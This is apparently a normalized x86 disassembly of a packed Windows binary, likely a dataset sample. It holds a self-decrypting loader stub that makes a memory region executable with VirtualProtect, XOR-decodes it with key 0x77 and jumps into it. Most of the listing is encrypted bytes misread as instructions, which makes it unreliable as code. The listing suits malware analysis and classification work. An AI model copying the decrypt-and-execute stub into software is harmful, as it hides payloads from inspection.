mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x24 ]
mov eax [ r-xdata ]
call sub_48b278
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_48b278
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x2c ]
mov eax [ r-xdata ]
call sub_48b278
sub_48b7d5
push edx
inc ebx
add [ eax - 0x74 ] bh
inc edx
add al ah
mov bh 0x48
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
mov esi esp
xor cl [ ebx - 0x4a3f878d ]
cli
das
jne r-xdata
xor esp edi
mov ah 0x48
add [ esp + ecx * 4 + 0x5e0045 ] al
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
mov [ esi + 0x77777511 ] bl
out 0xe7 eax
sahf
test al 0x46
ja r-xdata
mov bh 0x72
sbb al 0xac
jb r-xdata
nop
push r-xdata
call sub_48b7fc
out 0xe7 eax
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5e51
push ebx
out 0xe7 eax
out 0xe7 eax
mov [ edx ] al
or [ eax + 0x4e9e0320 ] 0x44
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x74 eax
cmp bh [ ebx + 0x52879e27 ]
ja r-xdata
call VirtualProtect
xor eax eax
jae r-xdata
nop
nop
lea edx [ eax + ebx ]
mov dl [ edx ]
nop
nop
xor dl 0x77
lea ecx [ eax + ebx ]
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x5e52
jne r-xdata
add ebx 0x4870
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0x24 eax
sahf
xchg edi eax
dec eax
ja r-xdata
out 0xe7 eax
out 0xe7 eax
and al 0x9e
out 0xe7 eax
out 0xe7 eax
out 0x78 eax
cmc
push edx
dec esi
ja r-xdata
mov bl 0xff
xor ah [ ebx - 0x560c506 ]
xor bl bh
mov al 0x32
lahf
cmp al 0x21
cmp bh [ esi + ebx * 4 ]
shl [ edi + esi * 2 + 0x77 ] cl
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
cld
aaa
outsd
pop ds
cld
sub cl [ ebx - 0x598b9304 ]
sahf
fdiv [ esi + 0x77 ]
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x78 eax
ficomp [ edi + 0x77 ]
out 0xe7 eax
js r-xdata
out 0xe7 eax
out 0xe7 eax
out 0x9f eax
popfd
inc ecx
ja r-xdata
out 0xe7 eax
out 0xe7 eax
lahf
push [ edx ]
retn
hlt
out 0xe7 eax
and al 0x1d
insd
and al 0x88
loope r-xdata
xchg [ ebp + 0x77 ] eax
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
ja r-xdata
ficomp [ edi + 0x77 ]
inc ebp
ja r-xdata
sahf
push edx
pop esi
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfa eax
cli
sti
mov cl [ eax + 0x20a49f88 ]
ja r-xdata
ja r-xdata
out 0x9e eax
ja r-xdata
js r-xdata
out 0xe7 eax
sahf
out 0x78 eax
xor al 0x57
ja r-xdata
jbe r-xdata
sahf
inc esp
pushad
ja r-xdata
mov ch 0x6a
ja r-xdata
ja r-xdata
ja r-xdata
inc esp
mov bh 0x37
sahf
add [ ecx ] esp
ja r-xdata
lahf
mov bl 0x45
ja r-xdata
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
adc esi edi
sub bl ch
cld
scasb [ edi ]
sbb eax 0x6ab59e14
cli
mov edi 0x2788888a
and al 0x24
sbb eax 0xe188246d
xchg edi eax
xchg ebp eax
sub [ ecx ] dl
dec [ edx ]
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x24 eax
hlt
out 0xe7 eax
out 0xe7 eax
and [ esi + 0x77772279 ] bl
and bh [ edi - 0x6 ]
mov edi 0x9f88888a
adc [ ecx ] bh
ja r-xdata

out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x1f eax
mov edx 0x20b103bb
pop ds
dec edi
mov bl [ ebp - 0x1b ]
and dh bh
int1
out 0x77 eax
ja r-xdata
out 0xe7 eax
xor [ ebp - 0x62 ] dh
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x11 eax
and [ edi + 0x77 ] esi
out 0xe7 eax
adc esi edi
xor bl [ ebp - 0x72340d06 ]
mov [ eax - 0x3361dfd9 ] cl
jpo r-xdata
out 0xf2 eax
mov bh 0x9e
ja r-xdata
lahf
sbb eax 0x6b9e281a
inc esi
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x11 eax
dec [ edx ]
test eax 0xfe1189fc
or dl [ edi - 0x1ee77bc ]
or dl [ ebp + 0xafe1128 ]
cmp [ ebx - 0x62 ] bh
add dh [ eax + 0x77 ]
ja r-xdata
out 0xe7 eax
out 0x2e eax
cld
daa
cli
cli
retn
xor ah [ ebx + 0x51569e2f ]
ja r-xdata
lahf
les eax [ ebp + 0x77 ]
ja r-xdata
mov cl ah
retn
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
int 0x88
bound esi [ edi + 0x77 ]
adc esi edi
arpl [ esi - 0x62 ] ax
push 0x30
ja r-xdata
ja r-xdata
ja r-xdata
out 0xe7 eax
out 0x20 eax
sahf
jns r-xdata
out 0xfc eax
ja r-xdata
nop
jo r-xdata
jae r-xdata
daa
js r-xdata
push ebx
ja r-xdata
out 0xe7 eax
sbb eax 0x72659e59
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x11 eax
mov [ ecx ] dl
dec [ edx ]
ja r-xdata
inc ecx
pop ds
imul ebx [ esi + 0x79 ] 0xf1fe20c0
fbstp [ edi + 0x77 ]
ja r-xdata
and [ eax ] 0xfe
int1
jecxz r-xdata
mov [ ecx ] ah
sahf
shl [ ecx + 0x77 ] 0x1
ja r-xdata
jo r-xdata
out 0xe7 eax
out 0xe7 eax
cld
out 0xe7 eax
xor [ edi + 0x77 ] dh
out 0xe7 eax
ja r-xdata
out 0xe7 eax
out 0xe7 eax
cld
out 0xce eax
inc edi
ja r-xdata
stosd [ edi ]
and [ edi + 0x77 ] dh
sahf
test [ ebp + 0x77 ] 0x37b3f477
pop ds
movsb [ edi ] [ esi ]
inc esi
mov cl 0x21
sahf
fwait
pop ecx
inc ebp
ja r-xdata
ja r-xdata
int 0x9e
dec eax
xor [ edi + 0x77 ] esi
out 0x9f eax
xchg ebp eax
cmp esi [ edi + 0x77 ]
sahf
pop ebp
out 0xe7 eax
out 0xe7 eax
out 0x9e eax
adc esp edi
dec eax
r-xdata
sahf
mov bh 0x72
sbb al 0xbe
jb r-xdata
ja r-xdata
insb
mov [ 0xfffffffffe201527 ] eax
int1
shl [ edi + 0x77 ] cl
ja r-xdata
and [ eax ] esp
ja r-xdata
inc ebx
ja r-xdata
pop ds
popfd
neg [ ebp + 0x31489ecd ]
ja r-xdata
ja r-xdata
lahf
aad 0x45
ja r-xdata
sahf
sub cl [ edi + 0x6732c078 ]
cli
out 0xfc eax
xor bh [ edi + 0x2a ]
mov ah 0xe7
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfc eax
mov [ edx + 0x77 ] ah
ja r-xdata
ja r-xdata
pop ebp
hlt
out 0x45 al
jpo r-xdata
cld
mov bl 0x7b
sahf
mov [ 0xffffffffe7777730 ] eax
and [ ecx ] esp
and [ esi + 0x77774980 ] ebx
sahf
xchg esi eax
je r-xdata
les ecx [ edx - 0x18187778 ]
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
sahf
out 0xe7 eax
out 0xe7 eax
out 0xf2 eax
mov esi 0x410af378
popfd
pop ds
ja r-xdata
ja r-xdata
jbe r-xdata
adc edi esp
aaa
jpo r-xdata
and bh ah
fwait
hlt
xor [ edi + 0x77 ] dh
out 0x21 eax
and [ ecx ] esp
sahf
or [ ecx + 0x77 ] 0x77
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xf4 eax
fwait
jpo r-xdata
fimul [ ecx + 0x77 ]
ja r-xdata
sahf
movsb [ edi ] [ esi ]
push ecx
ja r-xdata
cld
aaa
jpo r-xdata
fwait
hlt
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
cld
out 0xe7 eax
mov [ edx ] al
jg r-xdata
lahf
mov ecx [ eax + 0x63028888 ]
daa
mov al ah
fwait
out 0xe7 eax
out 0xe7 eax
out 0x2f eax
and [ esi + 0x777749da ] bl
out 0x27 eax
sahf
out 0x3c eax
ja r-xdata
daa
adc esi edi
xor ch [ edi + 0x11141d2f ]
cld
ja r-xdata
sbb eax 0x3afe1116
scasd [ edi ]
sbb eax 0x3afe1110
lodsd [ esi ]
sbb eax 0x3afe1159
stosd [ edi ]
adc esi edi
cmp ch [ ecx - 0x1ee4004 ]
ja r-xdata
sahf
or esi [ edx ]
ja r-xdata
hlt
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0x44 eax
mov bh 0xbe
mov ah 0xe7
out 0xe7 eax
out 0x20 eax
daa
sahf
xchg ecx eax
insd
aas
jne r-xdata
add eax 0xe788888a
out 0x78 eax
r-xdata
ja r-xdata
ja r-xdata
mov [ eax - 0x77d89cfe ] cl
loopne r-xdata
mov bl 0x7b
sahf
pop edi
jg r-xdata
adc esi edi
cmp dl [ edi + 0x7776a69e ]
out 0xe7 eax
out 0xe7 eax
daa
daa
daa
daa
and al 0x88
pushad
sahf
jo r-xdata
cmp bh [ ecx ]
sbb eax 0x24959e16
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
das
sahf
push eax
pop ecx
ja r-xdata
ja r-xdata
xor dl [ ebx + 0xf1db744 ]
adc esi edi
xor dl [ ecx - 0x68c501ef ]
sahf
cmpsb [ esi ] [ edi ]
jbe r-xdata
test eax 0xfe11bffc
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
ja r-xdata
adc [ ecx ] dl
ja r-xdata
ja r-xdata
ja r-xdata
cmp ebx [ esi + 0x77777f89 ]
sub eax 0x1d2e011d
adc ah bh
out 0xe7 eax
mov cl ah
sub [ esp + edi * 8 + 0x344e9e9b ] esi
ja r-xdata
mov cl ah
lds eax [ ecx + 0x77 ]
ja r-xdata
cld
cli
adc [ eax + 0x773a8732 ] esi
mov al 0x32
scasd [ edi ]
cmp bl [ esi ]
out 0xe7 eax
out 0xe7 eax
mov al 0x32
fwait
and [ edx ] edi
cmp al 0x21
lahf
ja r-xdata
out 0xe7 eax
mov al 0x32
mov esi [ esi + 0x77 ]
ja r-xdata
out 0xf4 eax
fwait
jpo r-xdata
mov bh 0x78
out 0x4b eax
mov bh 0x78
js r-xdata
ja r-xdata
xor cl [ ebx + 0x5d9e2c29 ]
ja r-xdata
xor al [ ebx + 0x45589e27 ]
ja r-xdata
out 0xe7 eax
daa
sahf
ja r-xdata
dec esi
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
and [ eax - 0x480dc4e0 ] ecx
js r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
adc al 0x5
push ds
hlt
xor [ edi + 0x77 ] dh
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x11 eax
sub al 0x9e
out 0xe7 eax
out 0xe7 eax
mov al ah
div [ edi + 0x77 ]
ja r-xdata
ja r-xdata
aaa
daa
cli
lahf
mov ecx [ eax - 0xd05d878 ]
fwait
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
cld
mov [ ecx ] edx
dec [ edx ]
cmp esp 0x3f029e8f
ja r-xdata
enter 0x775a 0x77
sahf
std
js r-xdata
out 0xe7 eax
loopne r-xdata
mov bh 0x78
pop ebp
sahf
out 0xe7 eax
out 0x2d eax
sbb eax 0x22fe1157
test eax 0x11041d2d
out 0xe7 eax
out 0xe7 eax
out 0x21 eax
mov [ eax ] ah
cmp esi edx
ja r-xdata
out 0x4b eax
out 0x1d eax
push ss
adc esi edi
cmp ch [ edi + 0x11101d2e ]
mov al 0x77
jne r-xdata
adc esi edi
xor dl [ edi + 0x7743a39e ]
ja r-xdata
cld
scasd [ edi ]
mov cl [ eax - 0x7f03d878 ]
lahf
xchg [ 0xffffffffb3f47777 ] dh
sahf
or [ ebx + 0x77 ] ebp
ja r-xdata
mov [ edi ] ah
cli
fwait
out 0xe7 eax
out 0x2e eax
cli
out 0xe7 eax
daa
mov [ ecx ] ah
adc ebx [ esi + 0x777762fd ]
out 0xe7 eax
out 0x88 eax
sub eax 0xfe11011d
and dh [ ebx + 0x69ea544 ]
outsb
ja r-xdata
ja r-xdata
adc esi edi
jbe r-xdata
setle [ edx ]
push 0xe7e77777
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x11 eax
out 0xe7 eax
adc esi edi
xor cl [ ebx - 0x598dd06 ]
ja r-xdata
mov bh 0x78
r-xdata
mov [ eax ] ah
pop ebx
cli
lahf
mov ecx [ eax + 0x419f2788 ]
pop eax
ja r-xdata
mov ch 0x11
sbb eax 0x101d2e01
cld
out 0x28 eax
out 0xe7 eax
daa
sahf
jmp 0xffffffffe7c0353a
xor al 0x77
ja r-xdata
out 0xe7 eax
out 0xe7 eax
sub eax 0xfe11571d
and ch [ ecx + 0x11041d2d ]
and al [ ebp + 0x78df9e2d ]
ja r-xdata
mov [ edx ] al
lahf
ja r-xdata
cld
and bh [ ebx - 0x62 ]
jpo r-xdata
outsb
ja r-xdata
push ebx
ja r-xdata
cmp edi [ ebp + 0x77 ]
ja r-xdata
out 0x88 eax
shl [ ebx - 0x60888889 ] 0x4b
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
cld
[ edi ]
mov cl [ eax + 0x53929e88 ]
mov [ eax + 0x32fae7e7 ] cl
mov esp [ edi ]
and [ eax + 0x2e9e7b02 ] cl
jae r-xdata
cld
cld
outsd
out 0x2f eax
sbb eax 0x32fe1152
test [ edi ] ebp
push edx
adc esi edi
xor al [ ebp + 0x111e1d2f ]
cli
xor ah [ edi + 0x7734399e ]
ja r-xdata
xor dl [ ebx + 0x11121d2f ]
out 0xe7 eax
out 0x88 eax
add bh [ ebx + 0x1d ]
ja r-xdata
ja r-xdata
adc al 0x8a
mov [ eax - 0xd87410e ] cl
test [ ebx + 0x77 ] edi
ja r-xdata
mov cl [ eax + 0x78bef288 ]
test [ ebx + 0x77 ] edi
ja r-xdata
inc esi
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
push 0x77
ja r-xdata
hlt
mov [ 0x777b169e ] eax
ja r-xdata
loope r-xdata
fwait
mov cl [ eax + 0x308c9f88 ]
ja r-xdata
out 0xf7 eax
ja r-xdata
ja r-xdata
xor [ edi + 0x77 ] esi
lahf
dec ebx
ja r-xdata
test eax 0xe777776a
mov bh 0x78
pop ebp
ja r-xdata
xor edx [ ebx + 0x6f ]
0xe777777b 0xe7e7
xchg [ 0xf218877 ] ebx
sahf
add ch [ eax + 0x77 ]
ja r-xdata
out 0xe7 eax
and bh ah
sahf
insd
cmp esi [ edi + 0x77 ]
js r-xdata
out 0xe7 eax
and [ ebx ] edi
sahf
mov [ edi + 0x77 ] edi
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x1f eax
test eax 0x88d4a01a
sar [ ebx - 0x61888889 ] 0x83
xor bl [ edi + 0x7f32fc27 ]
adc esi edi
cmp dl [ ebp + 0x7769679f ]
ja r-xdata
cli
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xf2 eax
mov [ esi + 0x77773346 ] bl
ja r-xdata
out 0xe7 eax
enter 0x7ccf 0x77
ja r-xdata
daa
cli

jpo r-xdata
mov edi 0x777bea9e
ja r-xdata
mov [ edx ] al
jpo r-xdata
xor bh [ edi - 0x62 ]
inc eax
outsb
ja r-xdata
adc esi edi
xor al [ ecx + 0x331db744 ]
adc esi edi
xor cl [ edi + 0x7746089e ]
ja r-xdata
ja r-xdata
sahf
r-xdata
aas
xor eax 0xe7e77777
mov al al
mov bl 0x77
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
js r-xdata
xor edx [ ebx + 0x6b ]
js r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
sahf
ja r-xdata
out 0xe7 eax
hlt
mov bl 0x8b
mov [ eax + 0x354a9e27 ] cl
ja r-xdata
sub cl [ edi + 0x77 ]
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x9e eax
sbb eax 0x32fe111e
sub [ edi ] 0x11
fwait
and al 0x21
and ah bh
out 0x22 eax
cld
inc esp
ja r-xdata
and al 0x4b
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x78 eax
inc esp
dec esp
ja r-xdata
inc esp
movsd [ edi ] [ esi ]
daa
ja r-xdata
cld
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
lahf
or [ ebp + 0x77 ] edx
ja r-xdata
add bh [ ebx - 0x4 ]
push 0xf4777764
or [ edi + 0x77 ] bh
js r-xdata
mov bh 0x21
and dh bh
xor cl [ ebx - 0x170cd02 ]
xor al [ ebx + 0x7755879e ]
ja r-xdata
out 0x1d eax
inc esi
adc esi edi
and ch [ ebx - 0x7774b562 ]
mov [ 0x2e9e2f16 ] bl
arpl [ edi + 0x77 ] si
out 0x37 eax
sbb eax 0x32fe1133
hlt
out 0xe7 eax
out 0xf2 eax
mov esi 0x773b479e
ja r-xdata
cli
cmp cl bh
cli
xor bl bh
sahf
nop
dec edx
ja r-xdata
out 0xe7 eax
out 0xf7 eax
or ah [ edi + 0x76 ]
js r-xdata
sahf
mov esi 0xe7777727
out 0xe7 eax
xor esi [ edi + 0x77 ]
fidivr [ ebx + 0x77 ]
hlt
cld
fwait
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
inc edi
daa
cli
xor dl [ edi - 0x7772b062 ]
mov [ ecx ] dl
dec [ edx ]
loope r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
test [ edx ] 0xf2787667
inc esi
inc esi
ja r-xdata
mov dh bh
jecxz r-xdata
hlt
out 0xe7 eax
out 0xf2 eax
mov esi 0x8873f378
mov [ eax - 0x6761480e ] cl
mov [ eax - 0x6403dd78 ] ecx
dec edx
aas
ja r-xdata
ja r-xdata
and al 0x9e
aaa
je r-xdata
div [ edi + 0x77 ]
ja r-xdata
out 0xe7 eax
out 0xe7 eax
lahf
cli
mov [ eax + 0x774f2a9f ] cl
ja r-xdata
ja r-xdata
int1
int1
mov bh 0x77
ja r-xdata
cli
ja r-xdata
lahf
sub cl [ edi + 0x77 ]
loop r-xdata
out 0xe7 eax
out 0xe7 eax
sbb [ edi ] ch
sbb eax 0x32fe1107
cmpsd [ esi ] [ edi ]
ja r-xdata
adc ah bh
scasd [ edi ]
adc esi edi
sub dl [ ecx - 0x26153bc ]
daa
ja r-xdata
cli
cli
jpo r-xdata
mov [ eax + 0x4a819e88 ] cs
mov [ edx ] al
cmp bh [ edi - 0x6 ]
add ah [ edi - 0x61 ]
aaa
pop edx
ja r-xdata
ja r-xdata
out 0xe7 eax
sbb eax 0x11affc10
cld
mov [ edi + 0x777735b2 ] ebx
hlt
out 0xe7 eax
inc esp
mov [ eax ] ah
sahf
add ecx [ edx + 0x77 ]
ja r-xdata
cli
mov [ 0x2788888a ] eax
js r-xdata
jg r-xdata
sahf
sbb al 0x6e
ja r-xdata
pop ebp
xor esi [ edi + 0x77 ]
out 0xe7 eax
out 0xe7 eax
pop ds
cli
[ esi ] [ edi ]
mov cl [ eax - 0x61dbd878 ]
xor eax 0xe777776a
mov al 0x32
mov ebx 0x12070e1f
ja r-xdata
dec edx
0x8aa3
mov [ eax + 0x21882427 ] cl
arpl si di
ja r-xdata
mov cl ah
out 0xe7 eax
out 0xe7 eax
cli
[ eax + ecx * 4 + 0x32aa9f88 ] ecx
ja r-xdata
and bh ah
out 0xe7 eax
out 0xe7 eax
out 0x88 eax
add ah [ edi - 0x62 ]
out 0xe7 eax
out 0xe7 eax
and al 0x88
and [ ebx + 0x24 ] eax
sahf
xor ebp [ ecx + 0x77 ]
ja r-xdata
sahf
add al 0x6a
ja r-xdata
and al 0x88
and [ ebx - 0x2 ] esp
daa
sbb eax 0xdbe18877
ja r-xdata
cld
cmp bh [ edi - 0x6 ]
out 0xe7 eax
out 0x20 eax
sahf
dec esi
r-xdata
ja r-xdata
adc esi edi
xor al [ edi ]
cli
xor ah [ ebx + 0x11 ]
inc [ edx ]
pop ds
cld
add cl [ ebx ]
daa
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
hlt
shl [ eax + 0x77 ] cl
out 0xe7 eax
out 0xe7 eax
mov [ edx ] al
sahf
ja r-xdata
out 0xe7 eax
pop ds
lahf
mov [ 0xfffffffff288888a ] eax
mov bh 0x9e
pop ebp
jae r-xdata
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xfc eax
not ebx
ja r-xdata
hlt
cld
mov cl 0x9e
out 0x9e eax
and eax 0xe7777774
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
pop ds
cli
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x78 eax
xchg ebp eax
cmp [ edi + 0x77 ] dh
out 0xe7 eax
adc esi edi
and cl bl
sub eax 0xfe11151d
and cl cl
sub eax 0x776a929e
sahf
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfe eax
or cl [ ebx + 0x774d8b9e ]
ja r-xdata
xchg esi eax
jne r-xdata
out 0xe7 eax
out 0x1f eax
sbb eax 0x47771f73
ja r-xdata
inc edi
ja r-xdata
mov al 0x32
cmpsd [ esi ] [ edi ]
add eax 0x9f575701
xor bh [ ebx + 0x12070e1f ]
ja r-xdata
loope r-xdata
cli
dec ecx
push 0x77
ja r-xdata
push edi
lahf
ja r-xdata
ja r-xdata
xchg edx eax
push 0x77
out 0xe7 eax
hlt
and [ eax + ecx * 4 ] ah
je r-xdata
mov cl 0x9f
pop ds
dec edi
ja r-xdata
ja r-xdata
ja r-xdata
jns r-xdata
ja r-xdata
ja r-xdata
ja r-xdata
mov [ eax - 0x4c0b5004 ] cl
jpo r-xdata
ja r-xdata
stc
mov bh 0x77
ja r-xdata
das
sbb eax 0x7d9e9e12
ja r-xdata
ja r-xdata
mov [ ecx ] ah
dec ebx
inc esp
mov bh 0x4e
or cl [ ebx + 0x28b7e378 ]
sub al 0x9e
mov bh [ ebx ]
ja r-xdata
pop edi
ja r-xdata
ja r-xdata
lodsb [ esi ]
push ebx
out 0x77 eax
ja r-xdata
enter 0x775b 0x77
out 0xe7 eax
out 0xf7 eax
or ah [ edi + 0x75 ]
js r-xdata
push ds
mov bh 0xf3
sub [ esi + 0x77776a04 ] bl
out 0xe7 eax
inc esp
mov bh 0x37
sahf
sub [ ebp + 0x77 ] 0xacf37877
pop edx
ja r-xdata
pop ds
dec edi
inc eax
dec ecx
and [ eax ] 0xfffffffe
int1
ja r-xdata
xor edx [ ebx + 0x67 ]
dec esp
mov ah 0x78
leave

jo r-xdata
out 0xe7 eax
lahf
sahf
xor al 0x74
ja r-xdata
mov bl 0x7b
[ esi ]
sahf
sub al 0x61
out 0xe7 eax
test [ edx ] 0xf2787567
ja r-xdata
jg r-xdata
cli
dec [ edx ]
mov ebx [ esi + 0x77774d8b ]
ja r-xdata
ja r-xdata
ja r-xdata
sbb eax 0x71d2f18
adc esi edi
xor ah [ edi - 0x61ede2d1 ]
sahf
jge r-xdata
ja r-xdata
loop r-xdata
out 0xe7 eax
js r-xdata
r-xdata
ja r-xdata
lds esi [ eax + 0x77 ]
ja r-xdata
cli
mov cl [ eax + 0x7fe3fe88 ]
je r-xdata
dec ebp
ja r-xdata
ja r-xdata
xchg [ edx + 0x1e ] ch
aaa
mov cl al
mov bl 0x77
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0x1f eax
loope r-xdata
and al 0x88
fwait
sahf
out 0xe7 eax
out 0xe7 eax
out 0x22 eax
cld
jne r-xdata
out 0x1d eax
or [ eax + 0x31d2f88 ] 0x11
out 0xe7 eax
out 0xf4 eax
mov dh 0x63
ja r-xdata
xor [ edi ] ecx
lahf
add al 0x5f
fwait
mov cl [ eax - 0x72816178 ]
mov [ eax + 0x2c29b744 ] cl
mov esi 0xe7e7e7b4
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x2d eax
adc esi edi
xor bl [ ecx ]
adc esi edi
and dl [ ecx ]
cld
cmpsd [ esi ] [ edi ]
inc esp
mov bh 0x11
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfa eax
ja r-xdata
ja r-xdata
sub al 0x61
ja r-xdata
sbb eax 0x69339e01
ja r-xdata
sub_48b7fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
nop
push r-xdata
call sub_48b7fc
out 0xe7 eax
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5e51
push ebx
call VirtualProtect
xor eax eax
nop
nop
lea edx [ eax + ebx ]
mov dl [ edx ]
nop
nop
xor dl 0x77
lea ecx [ eax + ebx ]
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x5e52
jne r-xdata
add ebx 0x4870
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
sub_48bb23
push edi
and al 0x21
and [ edi + 0x77774395 ] bl
sahf
xchg esi eax
je r-xdata
xor [ edi + 0x77 ] dh
out 0x21 eax
and [ ecx ] esp
sahf
or [ ecx + 0x77 ] 0x77
and bh ah
fwait
hlt
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
cld
out 0xe7 eax
out 0xe7 eax
out 0x9e eax
les ecx [ edx - 0x18187778 ]
out 0xe7 eax
and [ eax ] esp
ja r-xdata
jpo r-xdata
cld
ja r-xdata
ja r-xdata
jbe r-xdata
adc edi esp
aaa
jpo r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xf4 eax
fwait
jpo r-xdata
fimul [ ecx + 0x77 ]
ja r-xdata
sahf
movsb [ edi ] [ esi ]
push ecx
ja r-xdata
cld
aaa
jpo r-xdata
out 0xe7 eax
mov [ edx ] al
jg r-xdata
lahf
mov ecx [ eax + 0x63028888 ]
daa
mov al ah
fwait
out 0xe7 eax
out 0xe7 eax
out 0x2f eax
and [ esi + 0x777749da ] bl
out 0x27 eax
sahf
out 0x3c eax
ja r-xdata
daa
adc esi edi
xor ch [ edi + 0x11141d2f ]
cld
ja r-xdata
sbb eax 0x3afe1116
scasd [ edi ]
sbb eax 0x3afe1110
lodsd [ esi ]
sbb eax 0x3afe1159
stosd [ edi ]
adc esi edi
cmp ch [ ecx - 0x1ee4004 ]
ja r-xdata
sahf
or esi [ edx ]
ja r-xdata
hlt
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0x44 eax
mov bh 0xbe
mov ah 0xe7
out 0xe7 eax
out 0x20 eax
daa
sahf
xchg ecx eax
insd
aas
jne r-xdata
add eax 0xe788888a
out 0x78 eax
r-xdata
ja r-xdata
ja r-xdata
mov [ eax - 0x77d89cfe ] cl
loopne r-xdata
mov bl 0x7b
sahf
pop edi
jg r-xdata
adc esi edi
cmp dl [ edi + 0x7776a69e ]
out 0xe7 eax
out 0xe7 eax
daa
daa
daa
daa
and al 0x88
pushad
sahf
jo r-xdata
cmp bh [ ecx ]
sbb eax 0x24959e16
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
das
sahf
dec eax
r-xdata
mov bh 0x72
sbb al 0xbe
jb r-xdata
sahf
push eax
pop ecx
ja r-xdata
ja r-xdata
xor dl [ ebx + 0xf1db744 ]
adc esi edi
xor dl [ ecx - 0x68c501ef ]
sahf
cmpsb [ esi ] [ edi ]
jbe r-xdata
test eax 0xfe11bffc
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
ja r-xdata
adc [ ecx ] dl
ja r-xdata
ja r-xdata
ja r-xdata
mov cl ah
retn
fwait
hlt
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfc eax
inc ecx
mov [ edx + 0x77 ] ah
ja r-xdata
cmp ebx [ esi + 0x77777f89 ]
sub eax 0x1d2e011d
adc ah bh
